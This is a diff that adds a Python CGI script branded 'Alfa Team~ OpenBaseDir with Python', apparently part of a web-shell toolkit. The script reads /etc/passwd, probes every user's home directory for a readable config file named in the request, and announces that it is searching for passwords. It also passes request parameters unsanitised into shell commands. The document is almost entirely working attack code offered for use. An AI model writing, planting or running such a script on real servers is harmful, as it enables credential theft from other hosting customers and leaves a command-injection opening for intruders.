@@ -1,0 +1,41 @@
+#!/usr/bin/python
+try:
+	import cgitb; cgitb.enable()
+except:
+	pass
+import sys, cgi, os, commands
+form = cgi.FieldStorage() 
+dirname = form.getvalue('dirname')
+basename  = form.getvalue('basename')
+print "Content-type:text/html\r\n\r\n"
+print "<html>" 
+print "<head>"
+print "<title>Alfa Team~ OpenBaseDir with Python</title>"
+print "</head>"
+print "<body bgcolor='black'>"
+passwd = open("/etc/passwd","r")
+i = 0
+b = 0
+for line in passwd:
+	user = line.split(":")
+	if os.access(dirname+"/"+user[0]+"/"+basename, os.R_OK):
+		i += 1
+	b += 1
+passwd.close()
+print "<center><b><font color='yellow'>[ Alfa Team~ OpenBaseDir with Python ]</font></b><br><hr></center>"
+print "<font color='#00A220'><b>[+] Founded ",b," entrys in /etc/passwd</b></font><br>"	
+print "<font color='#FFFFFF'><b>[+] Founded ",i," readable "+dirname+"/*/"+basename+" directories</b></font><br>"
+print "<font color='#FF0000'><b>[~] Searching for passwords in config files...</b></font><br><br><br>"	
+i = 1
+passwd = open("/etc/passwd","r")
+for line in passwd:
+	user = line.split(":")
+	if os.access(dirname+"/"+user[0]+"/"+basename, os.R_OK):
+		print "<div style='border: 1px solid green;'><p><font color='yellow'><b>",i,": "+dirname+"/"+user[0]+"/"+basename+"</b><br>"
+		print "Use Command: dir<br>Result:<br></font><br><font color='red'>"
+		print  commands.getoutput("dir "+ dirname+"/"+user[0]+"/"+basename)
+		print "</font></div>"
+		i += 1
+passwd.close()
+print "</body>"
+print "</html>"
